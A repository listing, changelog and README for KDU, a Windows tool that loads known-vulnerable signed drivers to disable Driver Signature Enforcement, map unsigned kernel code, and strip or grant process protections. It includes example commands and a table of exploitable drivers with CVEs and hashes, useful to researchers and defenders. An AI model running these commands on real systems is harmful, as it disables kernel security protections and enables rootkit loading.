Project Path: arc_hfiref0x_KDU_9b9mgtzf

Source Tree:

```txt
arc_hfiref0x_KDU_9b9mgtzf
├── CHANGELOG.txt
├── Help
│   ├── kdu1.png
│   ├── kdu2.png
│   ├── kdu3.png
│   └── kdu4.png
├── LICENSE.txt
├── README.md
├── Source
│   ├── Examples
│   │   ├── BadRkDemo
│   │   │   ├── main.c
│   │   │   ├── main.h
│   │   │   ├── pgdemo.inf
│   │   │   ├── pgdemo.sln
│   │   │   ├── pgdemo.vcxproj
│   │   │   ├── pgdemo.vcxproj.filters
│   │   │   └── pgdemo.vcxproj.user
│   │   ├── DummyDrv
│   │   │   ├── dummy
│   │   │   │   ├── dummy.vcxproj
│   │   │   │   ├── dummy.vcxproj.filters
│   │   │   │   ├── dummy.vcxproj.user
│   │   │   │   └── main.c
│   │   │   └── dummy.sln
│   │   └── DummyDrv2
│   │       ├── dummy
│   │       │   ├── dummy.vcxproj
│   │       │   ├── dummy.vcxproj.filters
│   │       │   ├── dummy.vcxproj.user
│   │       │   ├── main.c
│   │       │   ├── main.h
│   │       │   └── r3request.c
│   │       └── dummy.sln
│   ├── Hamakaze
│   │   ├── KDU.vcxproj
│   │   ├── KDU.vcxproj.filters
│   │   ├── KDU.vcxproj.user
│   │   ├── compress.cpp
│   │   ├── compress.h
│   │   ├── diag.cpp
│   │   ├── diag.h
│   │   ├── drvmap.cpp
│   │   ├── drvmap.h
│   │   ├── dsefix.cpp
│   │   ├── dsefix.h
│   │   ├── global.h
│   │   ├── hde
│   │   │   ├── hde64.c
│   │   │   ├── hde64.h
│   │   │   ├── pstdint.h
│   │   │   └── table64.h
│   │   ├── idrv
│   │   │   ├── alcpu.cpp
│   │   │   ├── alcpu.h
│   │   │   ├── amd.cpp
│   │   │   ├── amd.h
│   │   │   ├── asrdrv.cpp
│   │   │   ├── asrdrv.h
│   │   │   ├── atszio.cpp
│   │   │   ├── atszio.h
│   │   │   ├── binalyze.cpp
│   │   │   ├── binalyze.h
│   │   │   ├── dbk.cpp
│   │   │   ├── dbk.h
│   │   │   ├── dell.cpp
│   │   │   ├── dell.h
│   │   │   ├── directio64.cpp
│   │   │   ├── directio64.h
│   │   │   ├── echodrv.cpp
│   │   │   ├── echodrv.h
│   │   │   ├── evga.cpp
│   │   │   ├── evga.h
│   │   │   ├── gmer.cpp
│   │   │   ├── gmer.h
│   │   │   ├── hilscher.cpp
│   │   │   ├── hilscher.h
│   │   │   ├── hp.cpp
│   │   │   ├── hp.h
│   │   │   ├── intel.cpp
│   │   │   ├── intel.h
│   │   │   ├── kph.cpp
│   │   │   ├── kph.h
│   │   │   ├── ldrsc.h
│   │   │   ├── lenovo.cpp
│   │   │   ├── lenovo.h
│   │   │   ├── lha.cpp
│   │   │   ├── lha.h
│   │   │   ├── mapmem.cpp
│   │   │   ├── mapmem.h
│   │   │   ├── marvinhw.cpp
│   │   │   ├── marvinhw.h
│   │   │   ├── mimidrv.cpp
│   │   │   ├── mimidrv.h
│   │   │   ├── netease.cpp
│   │   │   ├── netease.h
│   │   │   ├── nvidia.cpp
│   │   │   ├── nvidia.h
│   │   │   ├── phymem.cpp
│   │   │   ├── phymem.h
│   │   │   ├── procexp.cpp
│   │   │   ├── procexp.h
│   │   │   ├── rtcore.cpp
│   │   │   ├── rtcore.h
│   │   │   ├── rzpnk.cpp
│   │   │   ├── rzpnk.h
│   │   │   ├── tpup.cpp
│   │   │   ├── tpup.h
│   │   │   ├── tpw.cpp
│   │   │   ├── tpw.h
│   │   │   ├── winio.cpp
│   │   │   ├── winio.h
│   │   │   ├── winring0.cpp
│   │   │   ├── winring0.h
│   │   │   ├── zemana.cpp
│   │   │   ├── zemana.h
│   │   │   ├── zodiacon.cpp
│   │   │   └── zodiacon.h
│   │   ├── ipcsvc.cpp
│   │   ├── ipcsvc.h
│   │   ├── kduplist.h
│   │   ├── kduprov.cpp
│   │   ├── kduprov.h
│   │   ├── main.cpp
│   │   ├── pagewalk.cpp
│   │   ├── pagewalk.h
│   │   ├── ps.cpp
│   │   ├── ps.h
│   │   ├── res
│   │   │   ├── 274.ico
│   │   │   ├── SB_SMBUS_SDK.bin
│   │   │   └── Taigei32.bin
│   │   ├── resource.h
│   │   ├── resource.rc
│   │   ├── shellcode.cpp
│   │   ├── shellcode.h
│   │   ├── shellmasm.asm
│   │   ├── sig.h
│   │   ├── sup.cpp
│   │   ├── sup.h
│   │   ├── sym.cpp
│   │   ├── sym.h
│   │   ├── tests.cpp
│   │   ├── tests.h
│   │   ├── utils
│   │   │   └── GenAsIo2Unlock.exe
│   │   ├── victim.cpp
│   │   ├── victim.h
│   │   └── wdksup.h
│   ├── KDU.sln
│   ├── Shared
│   │   ├── consts.h
│   │   ├── kdubase.h
│   │   ├── ldr
│   │   │   ├── ldr.cpp
│   │   │   └── ldr.h
│   │   ├── minirtl
│   │   │   ├── _filename.c
│   │   │   ├── _filename.h
│   │   │   ├── _strcat.c
│   │   │   ├── _strcmp.c
│   │   │   ├── _strcmpi.c
│   │   │   ├── _strcpy.c
│   │   │   ├── _strend.c
│   │   │   ├── _strlen.c
│   │   │   ├── _strncmp.c
│   │   │   ├── _strncmpi.c
│   │   │   ├── _strncpy.c
│   │   │   ├── cmdline.c
│   │   │   ├── cmdline.h
│   │   │   ├── minirtl.h
│   │   │   ├── rtltypes.h
│   │   │   ├── strtou64.c
│   │   │   ├── strtoul.c
│   │   │   ├── u64tohex.c
│   │   │   └── ultohex.c
│   │   ├── ntos
│   │   │   ├── halamd64.h
│   │   │   ├── ntalpc.h
│   │   │   ├── ntbuilds.h
│   │   │   ├── ntos.h
│   │   │   ├── ntsup.c
│   │   │   └── ntsup.h
│   │   └── thirdparty
│   │       ├── tinyaes
│   │       │   ├── aes.c
│   │       │   └── aes.h
│   │       └── whirlpool
│   │           ├── nessie.h
│   │           ├── whirlpool.c
│   │           └── whirlpool.h
│   ├── Taigei
│   │   ├── Taigei.vcxproj
│   │   ├── Taigei.vcxproj.filters
│   │   ├── Taigei.vcxproj.user
│   │   ├── asio.cpp
│   │   ├── asio.h
│   │   ├── export.def
│   │   ├── global.h
│   │   ├── ipc.cpp
│   │   ├── ipc.h
│   │   └── main.cpp
│   ├── Tanikaze
│   │   ├── Tanikaze.vcxproj
│   │   ├── Tanikaze.vcxproj.filters
│   │   ├── Tanikaze.vcxproj.user
│   │   ├── data
│   │   │   ├── AsusCertService.bin
│   │   │   ├── KMUEXE.bin
│   │   │   ├── KMUSIG.bin
│   │   │   ├── NeacSafe64Cat.bin
│   │   │   ├── dbutilcat.bin
│   │   │   └── dbutilinf.bin
│   │   ├── drv
│   │   │   ├── ALSysIO64.bin
│   │   │   ├── AMDRyzenMasterDriver.bin
│   │   │   ├── AODDriver215.bin
│   │   │   ├── ATSZIO64.bin
│   │   │   ├── AppShopDrv103.bin
│   │   │   ├── AsIO3.bin
│   │   │   ├── AsrDrv106.bin
│   │   │   ├── AsrDrv107.bin
│   │   │   ├── AsrDrv107n.bin
│   │   │   ├── AxtuDrv.bin
│   │   │   ├── DbUtil2_3.bin
│   │   │   ├── DirectIo64.bin
│   │   │   ├── DirectIo64_2.bin
│   │   │   ├── EneIo64.bin
│   │   │   ├── EneTechIo64.bin
│   │   │   ├── GLCKIO2.bin
│   │   │   ├── HW64.bin
│   │   │   ├── HwRwDrv.x64.bin
│   │   │   ├── KExplore.bin
│   │   │   ├── KObjExp.bin
│   │   │   ├── KRegExp.bin
│   │   │   ├── LDD.bin
│   │   │   ├── MsIo64.bin
│   │   │   ├── NeacSafe64.bin
│   │   │   ├── PdFwKrnl.bin
│   │   │   ├── PhyDMACC.bin
│   │   │   ├── Phymemx64.bin
│   │   │   ├── RTCore64.bin
│   │   │   ├── SysDrv3S.bin
│   │   │   ├── TPwSav.bin
│   │   │   ├── ThrottleStop.bin
│   │   │   ├── WinRing0x64.bin
│   │   │   ├── amsdk.bin
│   │   │   ├── asio2.bin
│   │   │   ├── dbk64.bin
│   │   │   ├── dbutildrv2.bin
│   │   │   ├── echo_driver.bin
│   │   │   ├── eleetx1.bin
│   │   │   ├── ene2.bin
│   │   │   ├── etdsupp.bin
│   │   │   ├── gdrv.bin
│   │   │   ├── gmerdrv.bin
│   │   │   ├── heavenluo.bin
│   │   │   ├── iQVM64.bin
│   │   │   ├── inpoutx64.bin
│   │   │   ├── irec.bin
│   │   │   ├── kprocesshacker.bin
│   │   │   ├── lha.bin
│   │   │   ├── mimidrv.bin
│   │   │   ├── nvoclock.bin
│   │   │   ├── pcdsrvc_x64.bin
│   │   │   ├── physmem.bin
│   │   │   ├── pmxdrv64.bin
│   │   │   ├── procexp1627.bin
│   │   │   ├── procexp1702.bin
│   │   │   ├── rtkio64.bin
│   │   │   ├── rzpnk.bin
│   │   │   └── wnBios64.bin
│   │   ├── export.def
│   │   ├── main.cpp
│   │   ├── resource.h
│   │   ├── resource.rc
│   │   └── tanikaze.h
│   └── Utils
│       ├── GenAsIo2Unlock
│       │   ├── GenAsIo2Unlock.sln
│       │   ├── GenAsIo2Unlock.vcxproj
│       │   ├── GenAsIo2Unlock.vcxproj.filters
│       │   ├── GenAsIo2Unlock.vcxproj.user
│       │   └── main.cpp
│       ├── PCOMP
│       │   ├── PCOMP.cpp
│       │   ├── PCOMP.sln
│       │   ├── PCOMP.vcxproj
│       │   ├── PCOMP.vcxproj.filters
│       │   └── PCOMP.vcxproj.user
│       ├── SiPolicyChecker
│       │   ├── CProviders.cs
│       │   ├── CSiPolicy.cs
│       │   ├── Program.cs
│       │   ├── SiPolicyChecker.csproj
│       │   └── SiPolicyChecker.sln
│       └── readme.txt
└── appveyor.yml

```

`CHANGELOG.txt`:

```txt
v1.4.5 (Dec 02, 2025)
Migrated to MSVS 2026 with latest SDK and build tools
Added TechPowerUp ThrottleStop (CVE-2025-7771) as provider 55
Added physical and kernel memory read/write via Superfetch translation support
Added Win11 24H2 -pse support by @cailllev in #116
Added support for program launch as PPL WinTcb by @cailllev in #118
Added Process Mitigation stripping by @cailllev in #119
Small bugfixes
RTLs and readme update

v1.4.4 (Aug 19, 2025)
Added NetEase NeacSafe64 (CVE-2025-45737) driver as provider 54
Each shellcode variant updated to fix latest MSVC trashing issue
Added SiPolicyChecker (auxiliary utility)
Removed dead code
Reworked pattern matching for CiInitialize scan
Fixed symbols resolution for DSE values
Fixed some typos
Fixed EPROCESS corruption case
RTLs and readme update

v1.4.3 (Nov 10, 2024)
Added fresh HwRwDrv.x64 (WinRing0 tweaked copy-paste) driver as provider 53
Address issue #98 (Windows 24H2 CI.DLL!g_CiOptions search pattern is broken)
Rtls and readme update

v1.4.2 (Apr 17, 2024)
Added Intel ME tools driver as provider 52
Rtls and readme update

v1.4.1 (Dec 24, 2023)
Added AMD PdFwKrnl driver as provider 44 (CVE-2023-20598)
Added AMD OverDrive driver as provider 45 (same as RyzenMaster CVE-2020-12928 as they share same code base)
Added Wincor Nixdorf wnBios64 driver as provider 46
Added EVGA EleetX1 driver as provider 47
Added multiple ASRock drivers:
AxtuDrv (provider 48) from AsRock Extreme Tuner (which is basically Read&Write Everything driver signed with AsRock cert);
AppShopDrv103 (provider 49) from AsRock APP Shop which is basically resigned AsrDrv10X bypassing some banlists;
AsrDrv107n/AsrDrv107 (providers 50/51 respectively) from ASRock Motherboard Utility which both are further continuation of AsrDrv10X wormhole Read&Write Everything drivers line with removed AES requests encryption in "N" version and security measures to address previously assigned CVE. However these changes doesn't matter for BYOVD attacks and have zero value.
Readme updated.

v1.4.0 (Oct 24, 2023)
Added "-dmp ProcessId" command
Added NVidia "nvoclock" driver as provider 40
Added Binalyze driver as provider 41 (CVE-2023-41444)
Added PhyDMACC driver as provider 42
Readded Razer driver as provider 43 (CVE-2017-9769)
Readme update

v1.3.3 (Jul 19, 2023)
Added EchoDrv driver as provider 39

v1.3.2 (Jun 10, 2023)
Added MSI WinIo from MSI Foundation Service as provider 34
Added Hewlett Packard ETDi Support Driver as provider 35
Added Pavel Yosifovich "KExplore" driver as provider 36
Added Pavel Yosifovich "KObjExp" driver as provider 37
Added Pavel Yosifovich "KRegExp" driver as provider 38
Readme updated

v1.3.1 (Apr 17, 2023)
Added Lenovo driver as provider 32 (CVE-2022-3699)
Added Dell PC Doctor driver as provider 33
Add symbols usage for DSEFix
Internal rearrange including output
Readme updated

v1.3.0 (Mar 30, 2023)
Added physmem as provider 31

v1.2.8 (Dec 9, 2022)
Added -pse mode to run a program as ProtectedProcessLight-AntiMalware #44
Added asrdrv106 as provider 28 (CVE-2020-15368)
Added ALSysIO64 as provider 29
Added AMDRyzenMasterDriver as provider 30
Internal rearrange
Readme updated

v1.2.7 (Nov 18, 2022)
CODESYS, Zemana, inpoutx64 and newest DirectIo64 providers added

v1.2.5 (Aug 30, 2022)
Marvin HW64 added as provider 23 (from the recent APT)
New -diag command added for troubleshooting
Rtls updated
Project ported to MSVC 2022

v1.2.0 (Feb 18, 2022)
Mimikatz mimidrv wormhole driver added as provider 17
Process Hacker KProcessHacker2 wormhole driver added as provider 18
Process Explorer ProcExp152 wormhole driver added as provider 19
Dell DbUtilDrv2 (CVE-2021-36276) driver added as provider 20
Cheat Engine wormhole driver dbk64 added as provider 21
ASUSTeK GpuTweakII AsIO3 (EneTech wormhole next-gen) driver added as provider 22
Custom DSE patch callbacks
Internal rearrange to accompany several new providers
Readme updated

v1.1.2 (Jan 28, 2022)
Dell dbutil_2_3 (CVE-2021-21551) provider added
GMER "Antirootkit" provider added
Fix for invalid Tanikaze compilation result

v1.1.1 (May 16, 2021)
Fix #6

v1.1.0 (Apr 22, 2021)
New providers added, https://swapcontext.blogspot.com/2021/04/kdu-v11-release-and-bonus-asio3sys.html

v1.0.0 (Feb 9, 2020)
Initial release

```

`LICENSE.txt`:

```txt
MIT License

Copyright (c) 2020 - 2025 KDU Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

`README.md`:

```md
# KDU
[![Build status](https://img.shields.io/appveyor/build/hfiref0x/kdu?logo=appveyor)](https://ci.appveyor.com/project/hfiref0x/kdu)
[![Visitors](https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fhfiref0x%2Fkdu&countColor=%23263759&style=flat)](https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fhfiref0x%2Fkdu)

## Kernel Driver Utility

#### System Requirements

+ x64 Windows 7/8/8.1/10/11;
+ Administrative privilege is required.

# Purpose and Features

The purpose of this tool is to provide a simple way to explore the Windows kernel/components without requiring extensive setup or a local debugger.
It features:
+ Protected Process Hijacking via Process object modification;
+ Driver Signature Enforcement Overrider (similar to DSEFix);
+ Driver loader for bypassing Driver Signature Enforcement (similar to TDL/Stryker);
+ Support for various vulnerable drivers used as functionality "providers".

#### Usage

###### KDU -list
###### KDU -diag
###### KDU -prv ProviderID
###### KDU -ps ProcessID
###### KDU -pse Commandline
###### KDU -dmp ProcessID
###### KDU -dse value
###### KDU -map filename
* -list - list currently available providers;
* -diag - run system diagnostics for troubleshooting;
* -prv  - optional, select vulnerable driver provider;
* -ps   - modify process object of given ProcessID, downgrading any protections;
* -pse  - launch program as ProtectedProcessLight-AntiMalware (PPL);
* -psw  - launch program as ProtectedProcessLight-WinTcb (PPL);
* -dmp  - dump virtual memory of the given process;
* -dse  - write user-defined value to the system DSE state flags;
* -map  - map driver to the kernel and execute its entry point; this command has dependencies listed below;
  * -scv version - optional, select shellcode version, default 1;
  * -drvn name - driver object name (only valid for shellcode version 3);
  * -drvr name - optional, driver registry key name (only valid for shellcode version 3).

Example:
+ kdu -ps 1234
+ kdu -map c:\driverless\mysuperhack.sys
+ kdu -dmp 666
+ kdu -prv 1 -ps 1234
+ kdu -prv 1 -map c:\driverless\mysuperhack.sys
+ kdu -prv 6 -scv 3 -drvn DrvObj -map c:\install\e3600bm.sys
+ kdu -prv 6 -scv 3 -drvn edrv -drvr e3600bl -map c:\install\e3600bl.sys
+ kdu -dse 0
+ kdu -dse 6
+ kdu -pse "C:\Windows\System32\notepad.exe C:\TEMP\words.txt"
+ kdu -psw "C:\Windows\System32\cmd.exe"

Run on Windows 11 24H2*

<img width="1181" height="563" alt="image" src="https://github.com/user-attachments/assets/bbdf6d18-bc74-41e2-a7cf-297e439ec9df" />

Run on Windows 10 20H2*

<img src="https://raw.githubusercontent.com/hfiref0x/kdu/master/Help/kdu1.png" width="600" />

Compiled and run on Windows 8.1*

<img src="https://raw.githubusercontent.com/hfiref0x/kdu/master/Help/kdu2.png" width="600" />

Run on Windows 7 SP1 fully patched (precompiled version)*

<img src="https://raw.githubusercontent.com/hfiref0x/kdu/master/Help/kdu3.png" width="600" />

Run on Windows 10 19H2 (precompiled version, SecureBoot enabled)*

<img src="https://raw.githubusercontent.com/hfiref0x/kdu/master/Help/kdu4.png" width="600" />

###### All screenshots are from version 1.0X.

#### Limitations of -map command

Due to the unusual way of loading that does not involve the standard kernel loader, but uses overwriting already loaded modules with shellcode, there are some limitations:

+ Loaded drivers MUST BE specially designed to run as "driverless";

That means you cannot use parameters specified at your DriverEntry as they won't be valid. That also means you cannot load *any* drivers but only specially designed ones, or you need to alter shellcode routines.

+ No SEH support for target drivers;

There is no SEH code in x64. Instead, you have a table of try/except/finally regions described by a pointer in the PE header. If there is an exception, it may result in a BSOD.

+ No driver unloading;

Mapped code can't unload itself; however, you can release all resources allocated by your mapped code.
DRIVER_OBJECT->DriverUnload should be set to NULL.

+ Only ntoskrnl import resolved, everything else is up to you;

If your project needs another module dependency, you must rewrite this loader part.

+ Several Windows primitives are banned by PatchGuard from usage by dynamic code.

Because of the unusual way of loading, mapped driver won't be inside PsLoadedModulesList. That means any callback registered by such code will have its handler located in memory outside this list. PatchGuard may detect this and crash the system.

In general, if you want to know what you *should not do* in kernel, look at https://github.com/hfiref0x/KDU/tree/master/Source/Examples/BadRkDemo which contains a few examples of forbidden things.

#### Kernel traces note
This tool does not change (and will not change in future) internal Windows structures of MmUnloadedDrivers and/or PiDDBCacheTable. That's because:
+ KDU is not designed to circumvent third-party security software or various dubious software (e.g. anti-cheats);
+ These data can be a target for PatchGuard protection in the next major Windows 10 update.

You use it at your own risk. Some lazy AV may flag this tool as hacktool/malware.

# Supported Providers

Note: Provider with Id 0 is assumed as default if no -prv command is specified.

| Id     | Vendor         | Driver      | Software package                   | Version                      | MSFT blacklist*     |
|--------|----------------|-------------|------------------------------------|-----------------------------|----------------------|
| 0      | Intel          | IQVM64/Nal  | Network Adapter Diagnostic Driver  | 1.03.0.7                    | Cert                 |
| 1      | MSI            | RTCore64    | MSI Afterburner                    | 4.6.2 build 15658 and below | Page hash            |
| 2      | Gigabyte       | Gdrv        | Gigabyte TOOLS                     | Undefined                   | Name                 |
| 3      | ASUSTeK        | ATSZIO64    | ASUSTeK WinFlash utility           | Undefined                   | Name                 |
| 4      | Patriot        | MsIo64      | Patriot Viper RGB utility          | 1.0                         | Page hash            |
| 5      | ASRock         | GLCKIO2     | ASRock Polychrome RGB              | 1.0.4                       | Page hash            |
| 6      | G.SKILL        | EneIo64     | G.SKILL Trident Z Lighting Control | 1.00.08                     | Cert                 |
| 7      | EVGA           | WinRing0x64 | EVGA Precision X1                  | 1.0.2.0                     | Name                 |
| 8      | Thermaltake    | EneTechIo64 | Thermaltake TOUGHRAM software      | 1.0.3                       | Page hash            |
| 9      | Huawei         | PhyMemx64   | Huawei MateBook Manager software   | Undefined                   | Name, Page hash      |
| 10     | Realtek        | RtkIo64     | Realtek Dash Client Utility        | Various                     | Name                 |
| 11     | MSI            | EneTechIo64 | MSI Dragon Center                  | Various                     |                      |
| 12     | LG             | LHA         | LG Device Manager                  | 1.6.0.2                     | Name                 |
| 13     | ASUSTeK        | AsIO2       | ASUS GPU Tweak                     | 2.1.7.1 and below           |                      |
| 14     | PassMark       | DirectIo64  | PassMark Performance Test          | 10.1 and below              | Page hash            |
| 15     | GMER           | GmerDrv     | Gmer "Antirootkit"                 | 2.2 and below               | Name, Page hash, Cert|
| 16     | Dell           | DBUtil_2_3  | Dell BIOS Utility                  | 2.3 and below               | Page hash            |
| 17     | Benjamin Delpy | Mimidrv     | Mimikatz                           | 2.2 and below               | Cert                 |
| 18     | Wen Jia Liu    | KProcessHacker2  | Process Hacker                | 2.38 and below              | Name                 |
| 19     | Microsoft      | ProcExp152  | Process Explorer                   | 1.5.2 and below             | Name, Cert           |
| 20     | Dell           | DBUtilDrv2  | Dell BIOS Utility                  | 2.7 and below               |                      |
| 21     | DarkByte       | Dbk64       | Cheat Engine                       | 7.4 and below               | Cert, Name           |
| 22     | ASUSTeK        | AsIO3       | ASUS GPU TweakII                   | 2.3.0.3                     |                      |
| 23     | Marvin         | Hw          | Marvin Hardware Access Driver      | 4.9 and below               | Name                 |
| 24     | CODESYS        | SysDrv3S    | CODESYS SysDrv3S                   | 3.5.6 and below             | Cert                 |
| 25     | Zemana         | amsdk       | WatchDog/MalwareFox/Zemana AM      | 3.0.0 and below             |                      |
| 26     | HiRes Ent.     | inpoutx64   | Various                            | 1.2.0 and below             |                      |
| 27     | PassMark       | DirectIo64  | PassMark OSForensics               | Any                         |                      |
| 28     | ASRock         | AsrDrv106   | Phantom Gaming Tuning              | 1.0.6 and below             |                      |
| 29     | Arthur Liberman| ALSysIO64   | Core Temp                          | 2.0.11 and below            |                      |
| 30     | AMD            | AMDRyzenMasterDriver  | Multiple software packages | 2.0.0.0 and below           |                      |
| 31     | Hilscher       | physmem     | Physical Memory Viewer for Windows | 1.0.0.0                     |  Cert, Name          |
| 32     | Lenovo         | LDD         | Lenovo Diagnostics Driver for Windows 10 and later | 1.0.4.0 and below               |  Cert, Name          |
| 33     | Dell           | pcdsrvc_x64 | Dell PC Doctor                     | 6.2.2.0                     |                      |
| 34     | MSI            | winio       | MSI Foundation Service             | Undefined                   |                      |
| 35     | HP             | EtdSupport  | ETDi Support Driver                | 18.0 and below              |  Cert                |
| 36     | Pavel Yosifovich | KExplore  | Kernel Explorer                | Undefined              |                      |
| 37     | Pavel Yosifovich | KObjExp  | Kernel Object Explorer          | Undefined              |                      |
| 38     | Pavel Yosifovich | KRegExp  | Kernel Registry Explorer        | Undefined              |                      |
| 39     | Inspect Element LTD | EchoDrv  | Echo AntiCheat (spyware)  | Undefined              |  Hash                   |
| 40     | NVidia         | nvoclock  | NVidia System Utility Driver     | 7.0.0.32              |                      |
| 41     | Binalyze       | IREC  | Binalyze DFIR    | 3.11.0  |                      |
| 42     | DavidXXW       | PhyDMACC  | SLIC ToolKit     | 1.2.0  |  Page hash                    |
| 43     | Razer          | rzpnk  | Razer Synapse     |  2.20.15.1104   |                      |
| 44     | AMD            | PdFwKrnl  | AMD Radeon™ Software (Adrenalin Edition and PRO Edition) | 23.9.1 and below             |                      |
| 45     | AMD            | AODDriver  | AMD OverDrive Driver     | 2.1.5 and below              |                      |
| 46     | Wincor Nixdorf | wnBios64  | WinBios Driver     | 1.2.0 and below              |                      |
| 47     | EVGA  | EleetX1| EVGA ELEET X1     | 1.0.16.0 and below              |                      |
| 48     | ASRock         | AxtuDrv  | AsRock Extreme Tuner     | Undefined              |                      |
| 49     | ASRock         | AppShopDrv103  | ASRock APP Shop    | 1.0.58 and below       |                      |
| 50     | ASRock         | AsrDrv107n  | ASRock Motherboard Utility    | 3.0.498 and below       |                      |
| 51     | ASRock         | AsrDrv107  | ASRock Motherboard Utility    | 3.0.498 and below       |                      |
| 52     | Intel          | PmxDrv  | Intel(R) Management Engine Tools Driver    | 1.0.0.1003 and below       |                      |
| 53     | Jun Liu        | HwRwDrv  | Hardware read & write driver    | 1.0.0.6 and below       |                      |
| 54     | NetEase        | NeacSafe64  | NeacSafe64 mini-filter driver    | 1.0.0.1 and below       |                      |
| 55     | TechPowerUp    | ThrottleStop  | ThrottleStop                       | 3.0.0.0 and below             |                      |
| 56     | Toshiba        | TPwSav        | Toshiba power saving driver for laptops | 2.0.0.2 and below             |                      |

MSFT blacklist types:
* Cert - by certificate used to sign the driver which makes it possible to ban huge number of files at one time.
* Name - by original filename entry stored inside VERSION_INFO file resources, this type of bans are only possible with cross-checking of file version otherwise it will cause false-positives in case if the driver has "fixed/unaffected" version. 
* Hash/Page hash - by authenticode hash/page hash, allows MSFT to ban exact driver file.

# KDU provider details, alternatives are available
| Id     | Codebase       | Assigned CVE's | Hashes | 
|--------|----------------|-------------  |--------|
|0|Original|CVE-2015-2291|**File(SHA1):** D04E5DB5B6C848A29732BFD52029001F23C3DA75<br>**Authenticode(SHA1):** 2CBFE4AD0E1231FF3E19C19CA9311D952CE170B7<br>**Page(SHA1):** 55B90A6E4323FC1D7B71B23F81FC758F45740E02<br>**Page(SHA256):** FB14DC1657C0EDD18FA747005EB7125DBBD83595095D67906BB0B4D57222D4C1 |
|1|Semi-original|CVE-2019-16098|**File(SHA1):** F6F11AD2CD2B0CF95ED42324876BEE1D83E01775<br>**Authenticode(SHA1):** 4A68C2D7A4C471E062A32C83A36EEDB45A619683<br>**Page(SHA1):** 84152FA241C3808F8C7752964589C957E440403F<br>**Page(SHA256):** A807532037A3549AE3E046F183D782BCB78B6193163EA448098140563CF857CB |
|2|MAPMEM|CVE-2018-19320|**File(SHA1):** FE10018AF723986DB50701C8532DF5ED98B17C39<br>**Authenticode(SHA1):** 0F5034FCF5B34BE22A72D2ECC29E348E93B6F00F<br>**Page(SHA1):** DC02DA48DF2F9B558453847399A8DE47C5AD56CC<br>**Page(SHA256):** 95406C37FDE1B08524FAB782200C8BECAEC98A40B020F41C5BA13032FE9522FA |
|3|Semi-original|CVE-2023-41444|**File(SHA1):** 490109FA6739F114651F4199196C5121D1C6BDF2<br>**Authenticode(SHA1):** B66BF2B1B07F8F2BAB1418131AE66B0A55265F73<br>**Page(SHA1):** 04384DE86A18CE8D17DB3BB33CB9DD06868D4C32<br>**Page(SHA256):** 1871BE94AD775FD220F9A04C0F6B84C2C34CF898A4096E94359D9E5E269835DC |
|4|WINIO|CVE-2019-18845|**File(SHA1):** E6305DDDD06490D7F87E3B06D09E9D4C1C643AF0<br>**Authenticode(SHA1):** 7E732ACB7CFAD9BA043A9350CDEFF25D742BECB8<br>**Page(SHA1):** CDE1A50E1DF7870F8E4AFD8631E45A847C714C0A<br>**Page(SHA256):** 05736AB8B48DF84D81CB2CC0FBDC9D3DA34C22DB67A3E71C6F4B6B3923740DD5 |
|5|WINIO|CVE-2018-18535, CVE-2018-18536, CVE-2018-18537|**File(SHA1):** CC51BE79AE56BC97211F6B73CC905C3492DA8F9D<br>**Authenticode(SHA1):** D99B80B3269D735CAC43AF5E43483E64CA7961C3<br>**Page(SHA1):** 51E0740AAEE5AE76B0095C92908C97B817DB8BEA<br>**Page(SHA256):** E7F011E9857C7DB5AACBD424612CD7E3D12C363FDC8F072DDFAF9E2E5C85F5F3 |
|6|WINIO|CVE-2020-12446|**File(SHA1):** B4D014B5EDD6E19CE0E8395A64FAEDF49688ECB5<br>**Authenticode(SHA1):** 651B953CB03928E41424AD59F21D4978D6F4952E<br>**Page(SHA1):** 3727D824713E733558A20DE9876AABF1059D3158<br>**Page(SHA256):** 88C83F618C8F4069DED87C409A8446C5A30E22A303E64AAFF1C5BE6302ADEDB4 |
|7|WINRING0|CVE-2020–14979|**File(SHA1):** 012DB3A80FAF1F7F727B538CBE5D94064E7159DE<br>**Authenticode(SHA1):** 7AED8186977FCF7EE219DA493BAECDB95EC8040D<br>**Page(SHA1):** 9AB2257AE97DB4B0617640C90DD45AB7F144FBB9<br>**Page(SHA256):** D48209A183CDFEAADBD8A644730BD76BBF89C759844890739F934F242C226305 |
|8|WINIO||**File(SHA1):** 3CD037FBBA8AAE82C1B111C9F8755349C98BCB3C<br>**Authenticode(SHA1):** CE280412DD778CAFBE6DBB05B8CAB42E98D3AE56<br>**Page(SHA1):** 6CAFC03207391464AB7E69F47228CB82539BEBDE<br>**Page(SHA256):** 3F88ABF8908108207DA38DBC9E8690B3D63DB7F856B16E9F0D3A3B389FC72561 |
|9|WINIO||**File(SHA1):** 6ECFC7CCC4843812BFCCFB7E91594C018F0A0FF9<br>**Authenticode(SHA1):** 3C9F40AC72B0202CB40627FDEB7298079187193A<br>**Page(SHA1):** 6E7D8ABF7F81A2433F27B052B3952EFC4B9CC0B1<br>**Page(SHA256):** B7113B9A68E17428E2107B19BA099571AAFFC854B8FB9CBCEB79EF9E3FD1CC62 |
|10|PHYMEM||**File(SHA1):** B21CBA198D721737AABD882ADA6C91295A5975ED<br>**Authenticode(SHA1):** 7593D46A73EC00E00AEF3E9D0031C2B21B74ECFB<br>**Page(SHA1):** D4B640263D2A6C9906D4032F252CC81D838E2116<br>**Page(SHA256):** 77EC9BF2DBB106EF51D4DE49E70801D48001BF06146A370D0669E385B87C0826 |
